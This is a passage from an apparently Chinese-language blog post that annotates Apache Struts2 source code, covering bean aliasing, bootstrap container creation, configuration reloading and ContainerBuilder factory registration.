props);</span><br><span class="line">    alias(ActionValidatorManager.class, StrutsConstants.STRUTS_ACTIONVALIDATORMANAGER, builder, props);</span><br><span class="line">    alias(ValueStackFactory.class, StrutsConstants.STRUTS_VALUESTACKFACTORY, builder, props);</span><br><span class="line">    alias(ReflectionProvider.class, StrutsConstants.STRUTS_REFLECTIONPROVIDER, builder, props);</span><br><span class="line">    alias(ReflectionContextFactory.class, StrutsConstants.STRUTS_REFLECTIONCONTEXTFACTORY, builder, props);</span><br><span class="line">    alias(PatternMatcher.class, StrutsConstants.STRUTS_PATTERNMATCHER, builder, props);</span><br><span class="line">    alias(ContentTypeMatcher.class, StrutsConstants.STRUTS_CONTENT_TYPE_MATCHER, builder, props);</span><br><span class="line">    alias(StaticContentLoader.class, StrutsConstants.STRUTS_STATIC_CONTENT_LOADER, builder, props);</span><br><span class="line">    alias(UnknownHandlerManager.class, StrutsConstants.STRUTS_UNKNOWN_HANDLER_MANAGER, builder, props);</span><br><span class="line">    alias(UrlHelper.class, StrutsConstants.STRUTS_URL_HELPER, builder, props);</span><br><span class="line"></span><br><span class="line">    alias(TextParser.class, StrutsConstants.STRUTS_EXPRESSION_PARSER, builder, props);</span><br><span class="line"></span><br><span class="line">    alias(DispatcherErrorHandler.class, StrutsConstants.STRUTS_DISPATCHER_ERROR_HANDLER, builder, props);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Checker is used mostly in interceptors, so there be one instance of checker per interceptor with Scope.PROTOTYPE **/</span></span><br><span class="line">    alias(ExcludedPatternsChecker.class, StrutsConstants.STRUTS_EXCLUDED_PATTERNS_CHECKER, builder, props, Scope.PROTOTYPE);</span><br><span class="line">    alias(AcceptedPatternsChecker.class, StrutsConstants.STRUTS_ACCEPTED_PATTERNS_CHECKER, builder, props, Scope.PROTOTYPE);</span><br><span class="line">    alias(NotExcludedAcceptedPatternsChecker.class, StrutsConstants.STRUTS_NOT_EXCLUDED_ACCEPTED_PATTERNS_CHECKER</span><br><span class="line">            , builder, props, Scope.SINGLETON);</span><br><span class="line">    <span class="comment">// 切换到啊开发模式 取决于  配置文件中是否有配置</span></span><br><span class="line">    switchDevMode(props);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Convert Struts properties into XWork properties</span></span><br><span class="line">    <span class="comment">// 给struts的一些参数换个名字  有啥用不清楚</span></span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_LOG_MISSING_PROPERTIES, XWorkConstants.LOG_MISSING_PROPERTIES);</span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_ENABLE_OGNL_EXPRESSION_CACHE, XWorkConstants.ENABLE_OGNL_EXPRESSION_CACHE);</span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_ENABLE_OGNL_EVAL_EXPRESSION, XWorkConstants.ENABLE_OGNL_EVAL_EXPRESSION);</span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_ALLOW_STATIC_METHOD_ACCESS, XWorkConstants.ALLOW_STATIC_METHOD_ACCESS);</span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_CONFIGURATION_XML_RELOAD, XWorkConstants.RELOAD_XML_CONFIGURATION);</span><br><span class="line"></span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_EXCLUDED_CLASSES, XWorkConstants.OGNL_EXCLUDED_CLASSES);</span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_EXCLUDED_PACKAGE_NAME_PATTERNS, XWorkConstants.OGNL_EXCLUDED_PACKAGE_NAME_PATTERNS);</span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_EXCLUDED_PACKAGE_NAMES, XWorkConstants.OGNL_EXCLUDED_PACKAGE_NAMES);</span><br><span class="line"></span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_ADDITIONAL_EXCLUDED_PATTERNS, XWorkConstants.ADDITIONAL_EXCLUDED_PATTERNS);</span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_ADDITIONAL_ACCEPTED_PATTERNS, XWorkConstants.ADDITIONAL_ACCEPTED_PATTERNS);</span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_OVERRIDE_EXCLUDED_PATTERNS, XWorkConstants.OVERRIDE_EXCLUDED_PATTERNS);</span><br><span class="line">    convertIfExist(props, StrutsConstants.STRUTS_OVERRIDE_ACCEPTED_PATTERNS, XWorkConstants.OVERRIDE_ACCEPTED_PATTERNS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">alias</span><span class="params">(Class type, String key, ContainerBuilder builder, Properties props, Scope scope)</span> &#123;</span><br><span class="line">    <span class="comment">// 如果这个标准对象目前还没有被添加到容器中</span></span><br><span class="line">        <span class="keyword">if</span> (!builder.contains(type, Container.DEFAULT_NAME)) &#123;</span><br><span class="line">            <span class="comment">// 查看配置文件中是否设置了这个对象的名称</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">foundName</span> <span class="operator">=</span> props.getProperty(key, DEFAULT_BEAN_NAME);</span><br><span class="line">            <span class="comment">// 如果在容器中通过配置的名称和类型找到了对应的bean </span></span><br><span class="line">            <span class="comment">// 什么情况下bean会先于程序启动被装入到容器中？</span></span><br><span class="line">            <span class="comment">// 只能是用于在struts.xml等配置文件中配置了bean，覆盖了标准对象</span></span><br><span class="line">            <span class="comment">// 那么就需要为这个对象进行添加系统默认的名称以避免框架运行时找不到标准对象</span></span><br><span class="line">            <span class="keyword">if</span> (builder.contains(type, foundName)) &#123;</span><br><span class="line">                LOG.trace(<span class="string">&quot;Choosing bean (&#123;&#125;) for (&#123;&#125;)&quot;</span>, foundName, type.getName());</span><br><span class="line">                <span class="comment">// 那么给这个标准对象添加一个别名为  default</span></span><br><span class="line">                builder.alias(type, foundName, Container.DEFAULT_NAME);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 如果容器中找不到对象 则证明该标准对象还没有被添加到容器中</span></span><br><span class="line">                    <span class="comment">// 通过配置的名称进行类加载  这里证明配置的名称应该是一个全类名</span></span><br><span class="line">                    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> ClassLoaderUtil.loadClass(foundName, <span class="built_in">this</span>.getClass());</span><br><span class="line">                    LOG.trace(<span class="string">&quot;Choosing bean (&#123;&#125;) for (&#123;&#125;)&quot;</span>, cls.getName(), type.getName());</span><br><span class="line">                    <span class="comment">// 如果找到了对一个的类并成功加载 那么加u将这个类添加到容器中</span></span><br><span class="line">                    <span class="comment">// 使用的名称为 default </span></span><br><span class="line">                    builder.factory(type, cls, scope);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">                    <span class="comment">// Perhaps a spring bean id, so we&#x27;ll delegate to the object factory at runtime</span></span><br><span class="line">                    LOG.trace(<span class="string">&quot;Choosing bean (&#123;&#125;) for (&#123;&#125;) to be loaded from the ObjectFactory&quot;</span>, foundName, type.getName());</span><br><span class="line">                    <span class="keyword">if</span> (DEFAULT_BEAN_NAME.equals(foundName)) &#123;</span><br><span class="line">                        <span class="comment">// Probably an optional bean, will ignore</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (ObjectFactory.class != type) &#123;</span><br><span class="line">                            builder.factory(type, <span class="keyword">new</span> <span class="title class_">ObjectFactoryDelegateFactory</span>(foundName, type), scope);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Cannot locate the chosen ObjectFactory implementation: &quot;</span> + foundName);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            LOG.warn(<span class="string">&quot;Unable to alias bean type (&#123;&#125;), default mapping already assigned.&quot;</span>, type.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="初始化预加载配置对象（创建容器）"><a href="#初始化预加载配置对象（创建容器）" class="headerlink" title="初始化预加载配置对象（创建容器）"></a>初始化预加载配置对象（创建容器）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.inject.Inject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Container <span class="title function_">getContainer</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ContainerHolder.get() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ContainerHolder.get();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 容器管理器之前已经有创建了</span></span><br><span class="line">    <span class="type">ConfigurationManager</span> <span class="variable">mgr</span> <span class="operator">=</span> getConfigurationManager();</span><br><span class="line">    <span class="keyword">if</span> (mgr == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;The configuration manager shouldn&#x27;t be null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Configuration 对象之前没有创建  这里会创建  </span></span><br><span class="line">        <span class="type">Configuration</span> <span class="variable">config</span> <span class="operator">=</span> mgr.getConfiguration();</span><br><span class="line">        <span class="keyword">if</span> (config == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unable to load configuration&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Container</span> <span class="variable">container</span> <span class="operator">=</span> config.getContainer();</span><br><span class="line">            ContainerHolder.store(container);</span><br><span class="line">            <span class="keyword">return</span> container;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Configuration <span class="title function_">getConfiguration</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (configuration == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 创建 DefaultConfiguration 对象 并设置到属性中</span></span><br><span class="line">        setConfiguration(createConfiguration(defaultFrameworkBeanName));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 加载容器   ContainerProviders 就是之气那那一些列的init方法中设置的那些</span></span><br><span class="line">            configuration.reloadContainer(getContainerProviders());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ConfigurationException e) &#123;</span><br><span class="line">            setConfiguration(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Unable to load configuration.&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        conditionalReload();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> configuration;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> List&lt;PackageProvider&gt; <span class="title function_">reloadContainer</span><span class="params">(List&lt;ContainerProvider&gt; providers)</span> <span class="keyword">throws</span> ConfigurationException &#123;</span><br><span class="line">    packageContexts.clear();</span><br><span class="line">    loadedFileNames.clear();</span><br><span class="line">    List&lt;PackageProvider&gt; packageProviders = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// 这个参数就是传入到  containerProvider 的 register方法的第二个参数  </span></span><br><span class="line">    <span class="comment">// 所以在register方法调用完毕后 props中存的就是struts的所有配置属性</span></span><br><span class="line">    <span class="type">ContainerProperties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContainerProperties</span>();</span><br><span class="line">    <span class="comment">// 容器的构建器 这个容器的构建器属于用户，包含用户注入的bean等</span></span><br><span class="line">    <span class="type">ContainerBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContainerBuilder</span>();</span><br><span class="line">    <span class="comment">// 创建根容器 跟容器中主要包含的时系统的标准对象</span></span><br><span class="line">    <span class="type">Container</span> <span class="variable">bootstrap</span> <span class="operator">=</span> createBootstrapContainer(providers);</span><br><span class="line">    <span class="comment">// 遍历provider</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">final</span> ContainerProvider containerProvider : providers) &#123;</span><br><span class="line">        <span class="comment">// 容器注入  为provider注入字段  通过inject标签注入</span></span><br><span class="line">        bootstrap.inject(containerProvider);</span><br><span class="line">        <span class="comment">// 调用容器provider的init方法</span></span><br><span class="line">        containerProvider.init(<span class="built_in">this</span>);</span><br><span class="line">        <span class="comment">// 调用register方法</span></span><br><span class="line">        containerProvider.register(builder, props);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将provider设置的属性 转换为string类型的bean注入到容器中</span></span><br><span class="line">    props.setConstants(builder);</span><br><span class="line"></span><br><span class="line">    builder.factory(Configuration.class, <span class="keyword">new</span> <span class="title class_">Factory</span>&lt;Configuration&gt;() &#123;</span><br><span class="line">        <span class="keyword">public</span> Configuration <span class="title function_">create</span><span class="params">(Context context)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="keyword">return</span> DefaultConfiguration.<span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">Configuration</span>&gt; type() &#123;</span><br><span class="line">            <span class="keyword">return</span> DefaultConfiguration.<span class="built_in">this</span>.getClass();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 创建actionContext 最开始应该为空</span></span><br><span class="line">    <span class="type">ActionContext</span> <span class="variable">oldContext</span> <span class="operator">=</span> ActionContext.getContext();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// Set the bootstrap container for the purposes of factory creation</span></span><br><span class="line">        <span class="comment">// 创建 ActionContext 包括 值栈的创建</span></span><br><span class="line">        setContext(bootstrap);</span><br><span class="line">        <span class="comment">// 创建 用户容器  不加载单例对象</span></span><br><span class="line">        container = builder.create(<span class="literal">false</span>);</span><br><span class="line">        <span class="comment">// 这里啥也不会做  之前已经创建了ActionContext了  不会再重复创建</span></span><br><span class="line">        <span class="comment">// 这一步应该是为了避免前面 bootStrap 容器 中没有加载的有值栈对象工厂的情况</span></span><br><span class="line">        <span class="comment">// 但是这种情况真的会出现吗</span></span><br><span class="line">        setContext(container);</span><br><span class="line">        <span class="comment">// 获取  ObjectFactory 的bean实例</span></span><br><span class="line">        objectFactory = container.getInstance(ObjectFactory.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Process the configuration providers first</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">final</span> ContainerProvider containerProvider : providers) &#123;</span><br><span class="line">            <span class="comment">// 对PackageProvider进行特殊处理</span></span><br><span class="line">        <span class="comment">// 所有的ConfigurationProvider的子类都是 packageProvider</span></span><br><span class="line">        <span class="comment">// 包括 struts.xml等文件对应的provider</span></span><br><span class="line">            <span class="keyword">if</span> (containerProvider <span class="keyword">instanceof</span> PackageProvider) &#123;</span><br><span class="line">                <span class="comment">// 前面已经注入过依次了  这里再次注入意义何在</span></span><br><span class="line">                container.inject(containerProvider);</span><br><span class="line">                <span class="comment">// 调用loadPackages方法</span></span><br><span class="line">                <span class="comment">// 其实就是处理 struts.xml等文件对应的 package标签  </span></span><br><span class="line">                <span class="comment">// 即与action有关</span></span><br><span class="line">                ((PackageProvider) containerProvider).loadPackages();</span><br><span class="line">                packageProviders.add((PackageProvider) containerProvider);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Then process any package providers from the plugins</span></span><br><span class="line">        <span class="comment">// 用户可以自定义 packageProvider </span></span><br><span class="line">        Set&lt;String&gt; packageProviderNames = container.getInstanceNames(PackageProvider.class);</span><br><span class="line">        <span class="keyword">for</span> (String name : packageProviderNames) &#123;</span><br><span class="line">            <span class="type">PackageProvider</span> <span class="variable">provider</span> <span class="operator">=</span> container.getInstance(PackageProvider.class, name);</span><br><span class="line">            provider.init(<span class="built_in">this</span>);</span><br><span class="line">            provider.loadPackages();</span><br><span class="line">            packageProviders.add(provider);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 重构运行时配置 主要是对每个Action的配置进行补充， 如果一些关键配置缺省的话从父包的配置中获取默认的配置</span></span><br><span class="line">        <span class="comment">// 如 result 以及拦截器的配置</span></span><br><span class="line">        rebuildRuntimeConfiguration();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (oldContext == <span class="literal">null</span>) &#123;</span><br><span class="line">            ActionContext.setContext(<span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> packageProviders;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Container <span class="title function_">createBootstrapContainer</span><span class="params">(List&lt;ContainerProvider&gt; providers)</span> &#123;</span><br><span class="line">    <span class="comment">// 创建容器builder </span></span><br><span class="line">    <span class="comment">// 构造方法里主要创价了两个 factories 即 CONTAINER_FACTORY 以及 LOGGER_FACTORY</span></span><br><span class="line">    <span class="type">ContainerBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContainerBuilder</span>();</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">fmFactoryRegistered</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">// 遍历containerProvider</span></span><br><span class="line">    <span class="keyword">for</span> (ContainerProvider provider : providers) &#123;</span><br><span class="line">        <span class="keyword">if</span> (provider <span class="keyword">instanceof</span> FileManagerProvider) &#123;</span><br><span class="line">            <span class="comment">// 调用fileManagerProvider的register注入文件管理器</span></span><br><span class="line">            <span class="comment">// 文件管理器后面还会被注入一次 但是因为其是单例的所以没啥影响</span></span><br><span class="line">            <span class="comment">// 这里提前注入是因为后面有些provider的register方法会使用到filemanager取访问文件1</span></span><br><span class="line">            provider.register(builder, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (provider <span class="keyword">instanceof</span> FileManagerFactoryProvider) &#123;</span><br><span class="line">            <span class="comment">// 同上</span></span><br><span class="line">            provider.register(builder, <span class="literal">null</span>);</span><br><span class="line">            fmFactoryRegistered = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 注入标准对象</span></span><br><span class="line">    builder.factory(ObjectFactory.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(ActionFactory.class, DefaultActionFactory.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(ResultFactory.class, DefaultResultFactory.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(InterceptorFactory.class, DefaultInterceptorFactory.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(com.opensymphony.xwork2.factory.ValidatorFactory.class, com.opensymphony.xwork2.factory.DefaultValidatorFactory.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(ConverterFactory.class, DefaultConverterFactory.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(UnknownHandlerFactory.class, DefaultUnknownHandlerFactory.class, Scope.SINGLETON);</span><br><span class="line"></span><br><span class="line">    builder.factory(FileManager.class, <span class="string">&quot;system&quot;</span>, DefaultFileManager.class, Scope.SINGLETON);</span><br><span class="line">    <span class="keyword">if</span> (!fmFactoryRegistered) &#123;</span><br><span class="line">        builder.factory(FileManagerFactory.class, DefaultFileManagerFactory.class, Scope.SINGLETON);</span><br><span class="line">    &#125;</span><br><span class="line">    builder.factory(ReflectionProvider.class, OgnlReflectionProvider.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(ValueStackFactory.class, OgnlValueStackFactory.class, Scope.SINGLETON);</span><br><span class="line"></span><br><span class="line">    builder.factory(XWorkConverter.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(ConversionPropertiesProcessor.class, DefaultConversionPropertiesProcessor.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(ConversionFileProcessor.class, DefaultConversionFileProcessor.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(ConversionAnnotationProcessor.class, DefaultConversionAnnotationProcessor.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(TypeConverterCreator.class, DefaultTypeConverterCreator.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(TypeConverterHolder.class, DefaultTypeConverterHolder.class, Scope.SINGLETON);</span><br><span class="line"></span><br><span class="line">    builder.factory(XWorkBasicConverter.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(TypeConverter.class, XWorkConstants.COLLECTION_CONVERTER, CollectionConverter.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(TypeConverter.class, XWorkConstants.ARRAY_CONVERTER, ArrayConverter.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(TypeConverter.class, XWorkConstants.DATE_CONVERTER, DateConverter.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(TypeConverter.class, XWorkConstants.NUMBER_CONVERTER, NumberConverter.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(TypeConverter.class, XWorkConstants.STRING_CONVERTER, StringConverter.class, Scope.SINGLETON);</span><br><span class="line"></span><br><span class="line">    builder.factory(TextProvider.class, <span class="string">&quot;system&quot;</span>, DefaultTextProvider.class, Scope.SINGLETON);</span><br><span class="line"></span><br><span class="line">    builder.factory(LocalizedTextProvider.class, StrutsLocalizedTextProvider.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(TextProviderFactory.class, StrutsTextProviderFactory.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(LocaleProviderFactory.class, DefaultLocaleProviderFactory.class, Scope.SINGLETON);</span><br><span class="line"></span><br><span class="line">    builder.factory(TextParser.class, OgnlTextParser.class, Scope.SINGLETON);</span><br><span class="line"></span><br><span class="line">    builder.factory(ObjectTypeDeterminer.class, DefaultObjectTypeDeterminer.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(PropertyAccessor.class, CompoundRoot.class.getName(), CompoundRootAccessor.class, Scope.SINGLETON);</span><br><span class="line">    builder.factory(OgnlUtil.class, Scope.SINGLETON);</span><br><span class="line"></span><br><span class="line">    builder.factory(ValueSubstitutor.class, EnvsValueSubstitutor.class, Scope.SINGLETON);</span><br><span class="line">    <span class="comment">// 常量是一个 prototype类型的 String类型的bean 每一次访问都会创建一个新的bean</span></span><br><span class="line">    builder.constant(XWorkConstants.DEV_MODE, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    builder.constant(StrutsConstants.STRUTS_DEVMODE, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    builder.constant(XWorkConstants.LOG_MISSING_PROPERTIES, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    builder.constant(XWorkConstants.ENABLE_OGNL_EVAL_EXPRESSION, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    builder.constant(XWorkConstants.ENABLE_OGNL_EXPRESSION_CACHE, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">    builder.constant(XWorkConstants.RELOAD_XML_CONFIGURATION, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    builder.constant(StrutsConstants.STRUTS_I18N_RELOAD, <span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">    builder.constant(StrutsConstants.STRUTS_MATCHER_APPEND_NAMED_PARAMETERS, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">    <span class="comment">// 创建container实例</span></span><br><span class="line">    <span class="keyword">return</span> builder.create(<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 看看factory方法具体干了啥</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; ContainerBuilder <span class="title function_">factory</span><span class="params">(<span class="keyword">final</span> Class&lt;T&gt; type, <span class="keyword">final</span> String name,</span></span><br><span class="line"><span class="params">                                    <span class="keyword">final</span> Class&lt;? extends T&gt; implementation, <span class="keyword">final</span> Scope scope)</span> &#123;</span><br><span class="line">    <span class="comment">// This factory creates new instances of the given implementation.</span></span><br><span class="line">    <span class="comment">// We have to lazy load the constructor because the Container</span></span><br><span class="line">    <span class="comment">// hasn&#x27;t been created yet.</span></span><br><span class="line">    InternalFactory&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt; factory = <span class="keyword">new</span> <span class="title class_">InternalFactory</span>&lt;T&gt;() &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">volatile</span> ContainerImpl.ConstructorInjector&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt; constructor;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 当调用factory的create的时候就会真正的创建bean实例</span></span><br><span class="line">        <span class="comment">// internalFacotry是最内层的factory，外面还有其他的包装用的factory用来完成不同的功能</span></span><br><span class="line">        <span class="comment">// 如scopeFactory 用来确定bean的生命周期</span></span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="keyword">public</span> T <span class="title function_">create</span><span class="params">(InternalContext context)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (constructor == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 获取bean的构造函数</span></span><br><span class="line">                <span class="comment">// 这里采用了单例设计 即只获取一次构造方法 避免每一次创建bean的时候都重复获取</span></span><br><span class="line">                <span class="built_in">this</span>.constructor =</span><br><span class="line">                        context.getContainerImpl().getConstructor(implementation);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 创建对象实例</span></span><br><span class="line">            <span class="keyword">return</span> (T) constructor.construct(context, type);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt; type() &#123;</span><br><span class="line">            <span class="keyword">return</span> implementation;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;String, Object&gt;() &#123;&#123;</span><br><span class="line">                put(<span class="string">&quot;type&quot;</span>, type);</span><br><span class="line">                put(<span class="string">&quot;name&quot;</span>, name);</span><br><span class="line">                put(<span class="string">&quot;implementation&quot;</span>, implementation);</span><br><span class="line">                put(<span class="string">&quot;scope&quot;</span>, scope);</span><br><span class="line">            &#125;&#125;.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> factory(Key.newInstance(type, name), factory, scope);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> &lt;T&gt; ContainerBuilder <span class="title function_">factory</span><span class="params">(<span class="keyword">final</span> Key&lt;T&gt; key,</span></span><br><span class="line"><span class="params">                                     InternalFactory&lt;? extends T&gt; factory, Scope scope)</span> &#123;</span><br><span class="line">    <span class="comment">// 确认容器是否被创建  没有被创建才能继续执行</span></span><br><span class="line">    ensureNotCreated();</span><br><span class="line">    <span class="comment">// 检查容器中是否已经被注入了 同名的bean  type+name</span></span><br><span class="line">    checkKey(key);</span><br><span class="line">    <span class="comment">// 创建bean生命周期工厂  不同的生命周期得到的工厂是不一样的 具体体现在其create方法的实现不同上</span></span><br><span class="line">    <span class="comment">// 因为不同作用与需要使用不同的存储方案 如 thread就需要使用threadLocal的变量类型进行存储</span></span><br><span class="line">    <span class="keyword">final</span> InternalFactory&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt; scopedFactory = scope.scopeFactory(key.getType(), key.getName(), factory);</span><br><span class="line">    <span class="comment">// 所有的 factory 都保存在factories中</span></span><br><span class="line">    factories.put(key, scopedFactory);</span><br><span class="line">    <span class="comment">// 对scopefactory更进一步的包装  </span></span><br><span class="line">    <span class="comment">// 主要设计 ExternalContext 的设置</span></span><br><span class="line">    <span class="comment">// 这个类主要设计了 ExternalContext 的设置 只有 单例以及  EarlyInitializable类型的bean才被使用</span></span><br><span class="line">    <span class="comment">// 那么对于其他类型的bean来说岂不就是无用的，那么就存在一个自选消耗的问题，那么是否应该把一步放到if里面去。  </span></span><br><span class="line">    <span class="comment">// 这不提个pr吗？？？ </span></span><br><span class="line">    InternalFactory&lt;T&gt; callableFactory = createCallableFactory(key, scopedFactory);</span><br><span class="line">    <span class="comment">// 判断factor的类型  即bean标签的type属性指定的值</span></span><br><span class="line">    <span class="comment">// 指示这些bean需要提前进行装配  </span></span><br><span class="line">    <span class="keyword">if</span> (EarlyInitializable.class.isAssignableFrom(factory.type())) &#123;</span><br><span class="line">        earlyInitializableFactories.add(callableFactory);</span><br><span class="line">        <span class="comment">// 